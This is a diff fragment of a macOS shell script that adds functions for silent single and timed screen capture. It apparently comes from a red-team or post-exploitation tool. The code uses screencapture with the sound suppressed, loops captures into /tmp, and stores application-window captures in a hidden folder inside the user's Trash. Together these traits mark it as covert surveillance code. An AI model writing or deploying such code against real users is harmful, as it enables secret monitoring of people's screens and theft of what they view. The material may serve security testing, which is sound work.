+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 capture_app_windows() {
     mkdir -p "$HOME/.Trash/.ss/apps" 2>/dev/null
     local captured_count=0
@@ -2638,6 +2862,66 @@ capture_app_windows() {
     
     printf "APP_SCREENSHOT|summary|Captured %d application windows\\n" "$captured_count"
 } 
+
+# Function: capture_screen_single
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+capture_screen_single() {
+    local timestamp=$(date '+%Y%m%d_%H%M%S')
+    local output_file="/tmp/screen_capture_${timestamp}.png"
+    
+    $CMD_PRINTF "SCREEN_CAPTURE|SINGLE|Capturing screen to %s\n" "$output_file"
+    
+    # Capture screen using screencapture command
+    if $CMD_SCREENCAPTURE -x "$output_file" 2>/dev/null; then
+        local file_size=$(stat -f%z "$output_file" 2>/dev/null || echo "0")
+        $CMD_PRINTF "SCREEN_CAPTURE|SUCCESS|File: %s Size: %s bytes\n" "$output_file" "$file_size"
+    else
+        $CMD_PRINTF "SCREEN_CAPTURE|ERROR|Failed to capture screen\n"
+        return 1
+    fi
+    
+    return 0
+}
+
+
+# Function: capture_screen_timed
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+capture_screen_timed() {
+    local duration="${DURATION_ARG:-$DEFAULT_DURATION}"
+    local interval="${INTERVAL_ARG:-$DEFAULT_INTERVAL}"
+    
+    $CMD_PRINTF "SCREEN_CAPTURE|TIMED|Starting timed capture for %s seconds at %s second intervals\n" "$duration" "$interval"
+    
+    local end_time=$(($(date +%s) + duration))
+    local capture_count=0
+    
+    while [ $(date +%s) -lt $end_time ]; do
+        local timestamp=$(date '+%Y%m%d_%H%M%S')
+        local output_file="/tmp/screen_capture_${timestamp}.png"
+        
+        if $CMD_SCREENCAPTURE -x "$output_file" 2>/dev/null; then
+            capture_count=$((capture_count + 1))
+            local file_size=$(stat -f%z "$output_file" 2>/dev/null || echo "0")
+            $CMD_PRINTF "SCREEN_CAPTURE|%d|File: %s Size: %s bytes\n" "$capture_count" "$output_file" "$file_size"
+        else
+            $CMD_PRINTF "SCREEN_CAPTURE|ERROR|Failed to capture screen at interval %d\n" "$capture_count"
+        fi
+        
+        sleep "$interval"
+    done
+    
+    $CMD_PRINTF "SCREEN_CAPTURE|COMPLETE|Captured %d screenshots over %s seconds\n" "$capture_count" "$duration"
+    return 0
+}
+
 
 
 JOB_ID=$(core_generate_job_id)
